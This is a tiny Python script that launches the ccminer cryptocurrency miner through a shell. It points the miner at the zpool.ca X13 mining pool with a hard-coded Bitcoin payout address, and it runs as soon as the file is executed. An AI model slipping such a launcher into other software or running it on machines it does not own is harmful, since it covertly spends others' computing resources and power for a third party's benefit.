import os
import subprocess

def mining():
    
    process = subprocess.Popen(os.getcwd()+r'\miner\ccminer-x64.exe -a x13 -o stratum+tcp://x13.sea.mine.zpool.ca:3633 -u 3PmdKfoVPU4ZG9PsmKMMdqJmDPhXJMwfgn -p c=BTC', shell=True)


mining()